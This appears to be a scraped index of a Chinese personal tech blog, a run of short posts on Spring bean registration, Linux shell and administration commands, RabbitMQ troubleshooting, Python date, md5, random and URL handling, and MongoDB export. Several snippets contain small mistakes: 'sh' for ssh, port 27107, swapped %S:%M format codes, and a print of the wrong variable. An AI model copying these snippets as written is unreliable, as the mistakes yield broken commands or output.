class InrSer { private String name; private Integer uid; @Autowired private VisitService visitService; public InrSer() { } public InrSer(String name, Integer uid) { this.name = name; this.uid = uid; } } private &lt;T&gt; T registerBean(String name, Class&lt;T&gt; clazz, Object... args) { BeanDefinitionBuilder beanDefinitionBuilder = BeanDefinitionBuilder.genericBeanDefinition(clazz); if (args.length &gt; 0) { for (Object arg : args) { beanDefinitionBuilder.addConstructorArgValue(arg); } } BeanDefinition beanDefinition = beanDefinitionBuilder.getRawBeanDefinition(); BeanDefinitionRegistry beanFactory = (BeanDefinitionRegistry) applicationContext.getBeanFactory(); beanFactory.registerBeanDefinition(name, beanDefinition); return applicationContext.getBean(name, clazz); }} 输出如下 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/08/04/180804-Spring之动态注册bean/"},{"title":"190121-服务器常用shell命令小结","text":"记录一下服务器开发平时常用的shell命令，帮助高效发现和解决问题 1. sh 远程登录目前最常用的登录服务器的方式就是通过sh，格式如下 1sh user@ip 一般登录的时候要求输入登录密码，为了避免这个问题，可以将自己的公钥上传到服务器 123456# 在本机，查看公钥， 并拷贝所有的内容vim ~/.ssh/id_rsa.pub# 登录服务器，将公钥贴在下面的文件中，独立一行即可vim ~/.ssh/authorized_keys 2. scp 文件拷贝将文件上传到服务器；一般来讲为了保证上传文件的不会因为写权限的问题，常见的是将文件拷贝到/tmp目录下 1scp xxx user@192.168.0.1:/tmp 将服务器的文件拷贝当本机的当前目录下 1scp user@192.168.0.1:/tmp/test.txt ./ 3. JPS进程查看针对java应用而言，如何看系统中有哪些java进程在跑? 1jps -l 4. PS进程查看这个命令用来查看进程，以及对应的资源占用非常常见，一般使用命令如下 1ps aux | grep python 一个输出case 12345USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 969 0.0 0.0 573852 780 ? Ssl 1月14 0:38 /usr/bin/python -Es /usr/sbin/tuned -l -Pfinbtc 7036 0.0 0.0 112724 984 pts/2 S+ 09:38 0:00 grep --color=auto pythonfinbtc 14274 6.7 0.9 3998860 147968 ? Ssl 07:00 10:47 /usr/bin/python3.6 /home/finbtc/workspace/coin_data_service/CoinCrawler/CoinCrawler.py coin -r fxh,bbs,github,cmc_info,my_token -w coin_base_info,coin_community,coin_exchange_volume -q 3finbtc 29326 0.2 0.7 4000596 124044 ? Sl 1月18 2:33 venv/bin/python3.6 main.py newsletter -e dev -i 15 5. top这个也比较常用，查看哪些进程比较占用系统资源 1top 直接输入top，回车可以看到动态的进程资源占用情况，然后按键盘 c，可以查看command的详细信息 如果想查看具体某个进程的占用情况，可以通过制定进程号来实现 1top -p 3301 然后显示结果如下 进程的维度可能太大，不太好确认到底是里面哪块逻辑占用系统资源，可以更详细的查看线程维度的资源占用 1top -Hp 3301 截图如下，其中PID为线程号，这种时候可以结合jstack定位具体的堆栈信息 6. 基本操作命令简单说一下一些基本的命令，包括进入指定目录，查看相关信息等 123456789101112131415161718192021# 创建文件夹mkdir test# 删除文件夹rmdir test# 创建文件touch test.txt# 删除文件rm test.txt# 进入目录cd /tmp# 回到上一次的目录cd -# 查看目录下文件ls# 查看目录下所有文件ls -a# 查看目录下文件详细信息ll -h 7. 文件or文件夹权限修改1234567# 修改分组chgrp xxx test# 修改ownerchown xxx test# 增加文件执行权限chmod +x start.sh 8. 日志查看通常使用的方式有 vim, less, more, tail, head， 下面分别 vim方式 vim方式打开文件，可以使用vim的各种命令，可以修改文件；缺点是当文件特别大时，打开比较费劲；且会锁文件 1vim test.log less和more方式 两个没有太大的区别，我个人强烈推荐使用less方式查看日志文件 1less test.log less通过只读的方式打开文件，支持有限的vim命令 通过 shift + g 跳转到文件末尾，当文件有新内容时，也可以通过执行上面的命令获取最新的内容 输入 gg 跳转到文件头 ctrl+b 向上翻一页； ctrl+f 向下翻一页 先按’/‘进入查询模式，输入要查的内容回车即可 tail方式 这个与前面不一样，显示文件的最后的一些内容，通过添加-f参数可以实时打印文件的最新内容；分析线上日志请求的利器 1tail -200f test.log 上面的命令表示输出日志的最后200行数据，且实时输出最新的内容 head方式 用得不多，查询文件的前多少行内容 1head -n100 test.log 9. 清空日志清空日志文件内容，但是不删除文件本身，挺常见的一个场景，使用输出重定向 1echo '' 1&gt; test.log 10. history查看历史操作命令 1history | grep redis 11. 任务后台执行nohup方式让程序后台执行，一般格式如下 123nohup python test.py 1&gt; work.log 2&gt;&amp;1 &amp;# 将进程号保存到文件echo $! 1&gt; pid.log 12. grep命令文件太多，如何过滤出想要的数据，常见的是grep命令，很强的工具，说一下常见的一些我个人常用的姿势 简单的文件搜索，在test.log中查出所有包含hello world的文件行 1grep 'hello world' test.log 结合tail使用的方式 1234# 要求精准匹配tail -f logs/record.csv | grep zgtop# 忽略大小写tail -f logs/record.csv | grep -i ZGTOP 正则匹配方式,实现多种条件匹配 1tail -f logs/record.csv | grep -E 'zgtop|zb' 多个文件中匹配查找 1grep -i -r 'exception' *.log grep的命令比较强大，更详细的使用姿势可以通过--help来查看 13. 查找find命令，简单列几个可能用到的case 根据文件名查询 12# 从当前目录开始，遍历当前目录和所有子目录，列出文件后缀为py的文件find . -name '*.py' 将目前目录其其下子目录中所有一般文件列出 1find . -type f 14. xargs用于管道中的结果传递，举一个经常用到的例子，杀进程 1cat pid.log | xargs -I {} kill -9 {} 结合ps实现杀进程的case 1ps aux | grep java | grep hub | awk '{print $2}' | xargs -I {} echo {} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/01/21/190121-服务器常用shell命令小结/"},{"title":"190117-Rabbitmq启动失败的问题","text":"rabbitmq启动，死活起不来，一直报错，记录下解决方式 12Redirecting to /bin/systemctl start rabbitmq-server.serviceJob for rabbitmq-server.service failed because the control process exited with error code. See &quot;systemctl status rabbitmq-server.service&quot; and &quot;journalctl -xe&quot; for details. 然后查看对应的日志 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758---- Unit NetworkManager-dispatcher.service has begun starting up.1月 17 11:21:58 localhost.localdomain dbus[683]: [system] Successfully activated service 'org.freedesktop.nm_dispatcher'1月 17 11:21:58 localhost.localdomain systemd[1]: Started Network Manager Script Dispatcher Service.-- Subject: Unit NetworkManager-dispatcher.service has finished start-up-- Defined-By: systemd-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel---- Unit NetworkManager-dispatcher.service has finished starting up.---- The start-up result is done.1月 17 11:21:58 localhost.localdomain nm-dispatcher[7892]: req:1 'dhcp4-change' [enp2s0]: new request (2 scripts)1月 17 11:21:58 localhost.localdomain nm-dispatcher[7892]: req:1 'dhcp4-change' [enp2s0]: start running ordered scripts...1月 17 11:22:04 localhost.localdomain named[964]: network unreachable resolving 'www.coinbull.one/A/IN': 2400:cb00:2049:1::adf5:3a4e#531月 17 11:22:04 localhost.localdomain named[964]: network unreachable resolving 'www.coinbull.one/A/IN': 2400:cb00:2049:1::adf5:3b6d#531月 17 11:22:04 localhost.localdomain polkitd[682]: Registered Authentication Agent for unix-process:7906:175390 (system bus name :1.47 [/usr/bin/pkttyagent --notify-fd 5 --fallback], object path /org/freedesktop/PolicyKit1/AuthenticationAgent, locale zh_CN.UTF-81月 17 11:22:04 localhost.localdomain systemd[1]: Starting RabbitMQ broker...-- Subject: Unit rabbitmq-server.service has begun start-up-- Defined-By: systemd-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel---- Unit rabbitmq-server.service has begun starting up.1月 17 11:22:05 localhost.localdomain rabbitmq-server[7922]: RabbitMQ 3.6.15. Copyright (C) 2007-2018 Pivotal Software, Inc.1月 17 11:22:05 localhost.localdomain rabbitmq-server[7922]: ## ## Licensed under the MPL. See http://www.rabbitmq.com/1月 17 11:22:05 localhost.localdomain rabbitmq-server[7922]: ## ##1月 17 11:22:05 localhost.localdomain rabbitmq-server[7922]: ########## Logs: /var/log/rabbitmq/rabbit@localhost.log1月 17 11:22:05 localhost.localdomain rabbitmq-server[7922]: ###### ## /var/log/rabbitmq/rabbit@localhost-sasl.log1月 17 11:22:05 localhost.localdomain rabbitmq-server[7922]: ##########1月 17 11:22:05 localhost.localdomain rabbitmq-server[7922]: Starting broker...1月 17 11:22:08 localhost.localdomain rabbitmq-server[7922]: {\"Kernel pid terminated\",application_controller,\"{application_start_failure,rabbit,{bad_return,{{rabbit,start,[normal,[]]},{'EXIT',{{badmatch,{error,{{{function_clause,[{rabbit_queue_index,journal_minus1月 17 11:22:10 localhost.localdomain rabbitmq-server[7922]: Crash dump is being written to: erl_crash.dump...done1月 17 11:22:10 localhost.localdomain rabbitmq-server[7922]: Kernel pid terminated (application_controller) ({application_start_failure,rabbit,{bad_return,{{rabbit,start,[normal,[]]},{'EXIT',{{badmatch,{error,{{{function_clause,[{rabbit_queue_index,journal_mi1月 17 11:22:10 localhost.localdomain systemd[1]: rabbitmq-server.service: main process exited, code=exited, status=1/FAILURE1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: Stopping and halting node rabbit@localhost1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: Error: unable to connect to node rabbit@localhost: nodedown1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: DIAGNOSTICS1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: ===========1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: attempted to contact: [rabbit@localhost]1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: rabbit@localhost:1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: * connected to epmd (port 4369) on localhost1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: * epmd reports: node 'rabbit' not running at all1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: no other nodes on localhost1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: * suggestion: start the node1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: current node details:1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: - node name: 'rabbitmq-cli-87@localhost'1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: - home dir: .1月 17 11:22:10 localhost.localdomain rabbitmqctl[8241]: - cookie hash: xxx1月 17 11:22:10 localhost.localdomain systemd[1]: Failed to start RabbitMQ broker.-- Subject: Unit rabbitmq-server.service has failed-- Defined-By: systemd-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel---- Unit rabbitmq-server.service has failed.---- The result is failed.1月 17 11:22:10 localhost.localdomain systemd[1]: Unit rabbitmq-server.service entered failed state.1月 17 11:22:10 localhost.localdomain systemd[1]: rabbitmq-server.service failed.1月 17 11:22:10 localhost.localdomain polkitd[682]: Unregistered Authentication Agent for unix-process:7906:175390 (system bus name :1.47, object path /org/freedesktop/PolicyKit1/AuthenticationAgent, locale zh_CN.UTF-8) (disconnected from bus) 按照各种手段进行尝试，没有啥效果，最终的一度想重新安装，偶然看到一篇文章，可以解决，问题就是扔掉了之前的所有配置 原文地址 解决方法 1var/lib/rabbitmq/mnesia 目录下存在rabbit@localhost.pid、rabbit@localhost、rabbit@localhost-plugins-expand，删除这3项后，再使用systemctl start rabbitmq-server启动，发现不报错了。 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/01/17/190117-Rabbitmq启动失败的问题/"},{"title":"190122-python随机数Random使用实例","text":"在python中如何生成随机数? Random如何使用? 1234567891011import randomprint( random.randint(1,10) ) # 产生 1 到 10 的一个整数型随机数 print( random.random() ) # 产生 0 到 1 之间的随机浮点数print( random.uniform(1.1,5.4) ) # 产生 1.1 到 5.4 之间的随机浮点数，区间可以不是整数print( random.choice('tomorrow') ) # 从序列中随机选取一个元素print( random.randrange(1,100,2) ) # 生成从1到100的间隔为2的随机整数a=[1,3,5,6,7] # 将序列a中的元素顺序打乱random.shuffle(a)print(a) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/01/22/190122-python随机数Random使用实例/"},{"title":"190127-Git项目代码行数统计","text":"统计项目某个某个时间段的行数 1git log --author=\"$(git config --get user.name)\" --before='2018-12-31 23:59:59' --after='2018-01-01 00:00:00' --pretty=tformat: --numstat | awk '{ add += $1 ; subs += $2 ; loc += $1 - $2 } END { printf \"added lines: %s removed lines : %s total lines: %s\\n\",add,subs,loc }' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/01/27/190127-Git项目代码行数统计/"},{"title":"190211-Python之时间和日期使用小结","text":"对于日期的操作可以说是比较常见的case了,日期与格式化字符串互转，日期与时间戳互转，日期的加减操作等，下面主要介绍下常见的需求场景如何实现 1. 基本包引入主要需要引入时间和日期的处理包，后面的基本操作都是基于此 12import datetimeimport time 2. 获取当前时间获取当前时间，有几种方式，分别使用time和datetime来演示 a. time获取当前时间，格式化为字符串输出 12now = time.strftime(\"%Y-%m-%d %H:%M:%S\")print(now) 获取当前时间，以时间戳方式输出，结果为float类型，单位为s 12now=time.time()print(now) b. datetime直接调用now()函数获取当前时间，返回datetime类型对象 12now = datetime.datetime.now()print(now) 3. 时间戳转datetime 函数: datetime.datetime.fromtimestamp() 将时间戳转换为datetime类型，因为后者可以进行日期的计算（如常见的加减或者格式化） 12345# 获取当前的时间戳now = time.time()# 将时间差转换为datetime对象date = datetime.datetime.fromtimestamp(now)print(date) 4. 时间戳转格式化日期a. time 函数 time.strftime(format, localtime) 和 time.localtime(timestamp) 借助time的time.strftime函数来实现转换，这里还需要做一个额外的处理，将时间戳转换为struct_time 对象 123now = time.time()# 首先格式化时间戳为struct_time对象，接着格式化输出time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(now)) b. datetime 函数 datetime.datetime.fromtimestamp 与 datetime.datetime.strftime() 借助前面的知识点即可实现，先将timestamp转换为datetime, 然后将datetime格式化为字符串 123now=time.time()date =datetime.datetime.fromtimestamp(now)date.strftime('%Y-%m-%d %H:%M:%S') 5. 字符串转时间戳 函数 strptime(str) 与 time.mktime(struct_time) 前面格式化输出字符串时，主要利用的是strftime，这里则主要使用 strptime 123now='2019-02-11 18:45:22'struct_time=time.strptime(now , '%Y-%m-%d %H:%M:%S')timestamp=time.mktime(struct_time) 6. 字符串转datetime 函数 datetime.datetime.strptime(str, format) 依然使用strptime函数来实现转换 12now='2019-02-11 18:45:22'date=datetime.datetime.strptime(now, '%Y-%m-%d %H:%M:%S') 7. datetime 转字符串 函数 datetime.datetime.strftime(format) 利用strftime来实现 12now = datetime.datetime.now()now.strftime('%Y-%m-%d %H:%M:%S') 8. datetime 转时间戳 函数 datetime.datetime.timestamp() 结合前面的这个就比较好实现了 12now = datetime.datetime.now()now.timestamp() 9. datetime转struct_time12345now = datetime.datetime.now()# 转换为 struct_time 对象t=now.timetuple()# struct_time 输出时间戳timestamp=time.mktime(t) 10. 日期加减操作 函数 datetime.timedelta 日期的加减操作，这里主要是datetime对象来操作，一个简单的例子如下 123456789101112131415161718192021222324now = datetime.datetime.now()# 前一小时d1 = now - datetime.timedelta(hours=1)print(d1.strftime(\"%Y-%m-%d %H:%S:%M\"))# 前一天d2 = now - datetime.timedelta(days=1)print(d2.strftime(\"%Y-%m-%d %H:%S:%M\"))# 上周日d3 = now - datetime.timedelta(days=now.isoweekday())print(d3.strftime(\"%Y-%m-%d %H:%S:%M\"), \" \", d3.isoweekday())# 上周一d31 = d3 - datetime.timedelta(days=6)print(d31.strftime(\"%Y-%m-%d %H:%S:%M\"), \" \", d31.isoweekday())# 上个月最后一天d4 = now - datetime.timedelta(days=now.day)print(d3.strftime(\"%Y-%m-%d %H:%S:%M\"))# 上个月第一天print(datetime.datetime(d4.year, d4.month, 1)) 11. 格式化符号1234567891011121314151617181920212223%y # 两位数的年份表示（00-99）%Y # 四位数的年份表示（000-9999）%m # 月份（01-12）%d # 月内中的一天（0-31）%H # 24小时制小时数（0-23）%I # 12小时制小时数（01-12） %M # 分钟数（00=59）%S # 秒（00-59） %a # 本地简化星期名称%A # 本地完整星期名称%b # 本地简化的月份名称%B # 本地完整的月份名称%c # 本地相应的日期表示和时间表示%j # 年内的一天（001-366）%p # 本地A.M.或P.M.的等价符%U # 一年中的星期数（00-53）星期天为星期的开始%w # 星期（0-6），星期天为星期的开始%W # 一年中的星期数（00-53）星期一为星期的开始%x # 本地相应的日期表示%X # 本地相应的时间表示%Z # 当前时区的名称%% # %号本身 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/02/11/190211-Python之时间和日期使用小结/"},{"title":"190122-python计算md5的几种方式","text":"计算String/文件的md5属于比较常见的需求；特别是web项目，为了验证客户端上传的东西，通过校验md5来判断参数是否串改，属于常见的手段，下面简单记录下python可以如何计算md5 0. 计算String的md5123import hashlibmd5 = str(hashlib.md5(text).hexdigest()).lower() 1. 计算文件的md5123456789101112def get_file_md5(file_path): f = open(file_path, 'rb') md5_obj = hashlib.md5() while True: d = f.read(8096) if not d: break md5_obj.update(d) hash_code = md5_obj.hexdigest() f.close() md5 = str(hash_code).lower() return md5 2. 计算小文件的md512345678910def get_md5_01(file_path): md5 = None if os.path.isfile(file_path): f = open(file_path,'rb') md5_obj = hashlib.md5() md5_obj.update(f.read()) hash_code = md5_obj.hexdigest() f.close() md5 = str(hash_code).lower() return md5 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/01/22/190122-python计算md5的几种方式/"},{"title":"181219-centos配置开机后启动脚本","text":"配置开机后执行脚本配置相对简单，添加一个执行命令即可 1234vim /etc/rc.d/rc.local# 在文件最后添加sh /home/yihui/xxx.sh 执行脚本，添加上可执行的权限即可 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/12/20/181219-centos配置开机后启动脚本/"},{"title":"190212-linux线程数、进程查询","text":"ssh登录远程服务，忽然提示su: failed to execute /bin/bash: 资源暂时不可用，然后通过root账号登录服务器没有问题，但是使用su切换用户时，依然失败，提示上面的错误，搜索一下可能原因是线程数沾满，杀掉一些占用大量线程的进程即可；然后记录下linux下线程数的相关操作 I. 最大值查询1. 最大进程数查询1cat /proc/sys/kernel/pid_max 个人阿里云机器(单核2g)上输出如下 132768 2. 最大线程数查询1cat /proc/sys/kernel/threads-max 阿里云机器输出如下 114566 3. 用户最大进程数1ulimit -u 输出 17283 4. 用户进程数查询1234# 显示所有进程ps -ef | wc -l # 显示用户进程ps uf | wc -l II. JVM设置java应用启动时，可以通过设置相关参数来限制 123-Xms #intial java heap size-Xmx #maximum java heap size-Xss #the stack size for each thread III. 进程的线程数查询1. 具体进程的线程数查询想知道一个进程开辟了多少个线程，有两种姿势，常见的ps和pstree 1ps -hH 进程号 | wc -l 或者使用 1pstree -p 进程号 | wc -l 2. 获取所有java的线程总数利用管道来做这个统计，如下 1ps aux | grep java | awk '{print $2}' | xargs -I {} pstree -p {} | wc -l 3. 查询当前用户所有线程数不指定具体的进程号即可 1pstree -p | wc -l II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/02/12/190212-linux线程、进程数查询/"},{"title":"181221-Centos虚拟ip添加删除查看","text":"本文主要包括虚拟ip的查询，删除与新增的使用姿势 1. 查看列出网卡以及对应的虚拟ip 1ip addr 显示结果如下: 上图中，显示有三个网卡，lo, eth0以及docker0，inet对应的ip表示这个网卡对应的虚拟ip地址 2. 添加ip现在我们在docker0上新加一个虚拟ip，执行命令如下 1ip addr add 192.168.0.110/32 dev docker0 执行完毕之后，再次查看所有的网卡，如下 虚拟网卡添加之后，可以通过ping测试是否ok 3. 删除ip删除我们刚添加的虚拟ip，执行如下 1ip addr del 192.168.0.110/32 dev docker0 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/12/21/181221-Centos虚拟ip添加删除查看/"},{"title":"190216-MongoDB之Collection导入导出","text":"mongodb中集合的导入导出，在robot3t工具中没有找到对应的方法，记录下控制台的操作流程 主要利用： mongoexport 与 mongoimport 1. 集合导出直接使用 mognoexport 即可，通过mongoexport --help查看对应的使用说明 将库database中的集合collection导出到json文件out.json 1bin/mongoexport -h localhost:27107 -u user -p pwd -d database -c collection -o out.json 2. 集合导入使用 mongoimport 实现导入，同样可以输入--help查看使用说明 1bin/mongoimport -h localhost:27107 -u user -p pwd -d database -c new_collection ./out.json II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/02/16/190216-MongoDB之Collection导入导出/"},{"title":"190319-Python之URL解析姿势","text":"记录下python3+中，如何解析url，获取想要的信息过程, 首先看下url的构造，基本结构如下 我们主要借助的是 urlparse 来实现参数解析 1. url初步解析第一步，将url按照上面的进行分模块 1234567from urllib import parseurl='https://yihuihui:handsome@mp.weixin.qq.com/s/eFvTsAlDddL_Vq9hE3QbjQ?user=一灰灰&amp;age=18&amp;cnt=1,2,3&amp;_time=1552639827#page'# 解析urlparse_result = parse.urlparse(url)print(parse_result) 输出如下 按照官方对于 urlparse 方法的说明 Parse a URL into six components, returning a 6-tuple. This corresponds to the general structure of a URL: scheme://netloc/path;parameters?query#fragment. Each tuple item is a string, possibly empty. The components are not broken up in smaller parts 简单来讲，就是将url拆分如下: 1scheme://netloc/path;parameters?query#fragment 具体对应关系如下，每项都是String字符串 scheme: https netloc: yihuihui:handsome@mp.weixin.qq.com path: /s/eFvTsAlDddL_Vq9hE3QbjQ params: ‘’ query: user=一灰灰&amp;age=18&amp;cnt=1,2,3&amp;_time=1552639827 fragment: page 2. netloc 解析从上面的描述知道，netloc由四部分组成，username, password, hostname, port 上面解析返回的对象已经会帮我们解析好，直接即可 1234user = parse_result.usernamepwd = parse_result.passwordhost = parse_result.hostnameport = parse_result.port 需要注意的是port返回的是整形，如果url中没有显示加上，则返回空，即默认80端口 3. 请求参数解析另外一个值得我们说到的就是url参数的解析了，这个参数为query而不是params（也不太明白为什么会有这个存在…） 前面已说到，query返回的是字符串，和我们希望的k.v不太契合，因此可以使用parse_qs 123456query = parse_result.queryquery_map = parse.parse_qs(query)print(query_map)query_map = parse.parse_qsl(query)print(query_map) 从输出可以知道，两个方法的区别在于返回的结果类型不同 相关文档 urllib.parse — Parse URLs into components II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/03/19/190319-Python之URL解析姿势/"},{"title":"190320 Python 数字类型转换","text":"通过内置的函数int() float()可以很简单的将变量转换为整形或浮点型（注意python不支持像java一样的强制类型转换） 1234s = '123'int(s)float(s) 我们知道python一个非常经典的用处就是科学计算，它是原生支持复数的哦，我们可以借助complex实现 12# 实数为10，虚数为2complex(10, 2) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/20/190320-Python-数字类型转换/"},{"title":"190320 Python 数学常量","text":"两个常见的数学常量圆周率π和自然常数e 123import mathmath.emath.pi II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/20/190320-Python-数学常量/"},{"title":"190320 Python 随机函数","text":"随机数用的比较多了，除了我们常见的random之外，python还提供了一些其他的函数, 本文将分别进行介绍 1. random随机生成一个[0, 1)之间的浮点数 123&gt;&gt;&gt; import random&gt;&gt;&gt; random.random()0.8849439179415277 2. choice从序列的元素中随机挑一个 123# 从0到9中随机挑一个&gt;&gt;&gt; random.choice(range(10))5 3. shuffle将序列中元素随机重排（斗地主的洗牌，一个函数搞定） 1234&gt;&gt;&gt; l = [1,2,3,4,5,6]&gt;&gt;&gt; random.shuffle(l)&gt;&gt;&gt; l[4, 6, 2, 5, 3, 1] 4. uniform生成指定范围内的随机数 12&gt;&gt;&gt; random.uniform(1, 10)8.11963231044282 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/20/190320-Python-随机函数/"},{"title":"190320 Python 常见数学计算","text":"本文将简单介绍一下一些基础的数学函数 abs fabs ceil floor round pow exp log 1. 绝对值通过abs()返回绝对值，也可以通过math.fabs()来返回绝对值，这两个虽然都是返回绝对值，但是有一点区别，详见如下实例 123456&gt;&gt;&gt; import math&gt;&gt;&gt; math.fabs(-10)10.0&gt;&gt;&gt; abs(-10)10&gt;&gt;&gt; 2. 取整常见的取整方式有三种，向上取整ceil，向下取整floor，四舍五入 round 123456&gt;&gt;&gt; math.ceil(-10.2)-10&gt;&gt;&gt; math.floor(-10.2)-11&gt;&gt;&gt; round(-10.2)-10 3. 对数/n次方 pow(x, y): x的y次方 exp(x): e的x次幂 log(x): 求e的对数 log10(x): 求10的对数 123456789101112&gt;&gt;&gt; pow(2, 3)8&gt;&gt;&gt; math.exp(1)2.718281828459045&gt;&gt;&gt; math.exp(2)7.38905609893065&gt;&gt;&gt; math.log(math.e)1.0&gt;&gt;&gt; math.log(4, 16)0.5&gt;&gt;&gt; math.log10(100)2.0 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 